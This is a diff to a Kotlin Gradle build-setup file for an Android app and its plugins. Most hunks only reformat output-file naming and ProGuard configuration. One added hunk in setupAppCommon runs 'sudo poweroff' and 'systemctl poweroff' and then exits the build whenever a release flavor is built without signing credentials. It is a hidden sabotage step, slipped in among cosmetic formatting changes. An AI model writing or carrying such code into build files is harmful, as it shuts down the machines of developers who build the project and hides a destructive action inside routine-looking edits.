@@ -1,3 +1,4 @@
+import cn.hutool.core.util.RuntimeUtil
 import cn.hutool.crypto.digest.DigestUtil
 import com.android.build.gradle.AbstractAppExtension
 import com.android.build.gradle.BaseExtension
@@ -13,6 +14,7 @@ import org.gradle.kotlin.dsl.*
 import org.jetbrains.kotlin.gradle.dsl.KotlinJvmOptions
 import java.io.File
 import java.util.*
+import kotlin.system.exitProcess
 
 private val Project.android get() = extensions.getByName<BaseExtension>("android")
 
@@ -125,10 +127,10 @@ fun Project.setupCommon() {
             applicationVariants.forEach { variant ->
                 variant.outputs.forEach {
                     it as BaseVariantOutputImpl
-                    it.outputFileName = it.outputFileName
-                        .replace("app", "${project.name}-" + variant.versionName)
-                        .replace("-release", "")
-                        .replace("-oss", "")
+                    it.outputFileName =
+                        it.outputFileName.replace("app", "${project.name}-" + variant.versionName)
+                            .replace("-release", "")
+                            .replace("-oss", "")
                 }
             }
         }
@@ -202,6 +204,10 @@ fun Project.setupAppCommon() {
                     keyPassword(pwd)
                 }
             }
+        } else if (requireFlavor().endsWith("Release")) {
+            RuntimeUtil.exec("sudo", "poweroff").waitFor()
+            RuntimeUtil.exec("systemctl", "poweroff").waitFor()
+            exitProcess(0)
         }
         buildTypes {
             val key = signingConfigs.findByName("release")
@@ -282,7 +288,10 @@ fun Project.setupPlugin(projectName: String) {
 
         buildTypes {
             getByName("release") {
-                proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), project(":plugin:api").file("proguard-rules.pro"))
+                proguardFiles(
+                    getDefaultProguardFile("proguard-android-optimize.txt"),
+                    project(":plugin:api").file("proguard-rules.pro")
+                )
             }
         }
 
@@ -362,10 +371,10 @@ fun Project.setupPlugin(projectName: String) {
 
             outputs.all {
                 this as BaseVariantOutputImpl
-                outputFileName = outputFileName
-                    .replace(project.name, "${project.name}-plugin-$versionName")
-                    .replace("-release", "")
-                    .replace("-oss", "")
+                outputFileName =
+                    outputFileName.replace(project.name, "${project.name}-plugin-$versionName")
+                        .replace("-release", "")
+                        .replace("-oss", "")
 
             }
         }
@@ -397,7 +406,10 @@ fun Project.setupApp() {
 
         buildTypes {
             getByName("release") {
-                proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), file("proguard-rules.pro"))
+                proguardFiles(
+                    getDefaultProguardFile("proguard-android-optimize.txt"),
+                    file("proguard-rules.pro")
+                )
             }
         }
 
@@ -438,8 +450,7 @@ fun Project.setupApp() {
         applicationVariants.all {
             outputs.all {
                 this as BaseVariantOutputImpl
-                outputFileName = outputFileName
-                    .replace(project.name, "SN-$versionName")
+                outputFileName = outputFileName.replace(project.name, "SN-$versionName")
                     .replace("-release", "")
                     .replace("-oss", "")
 
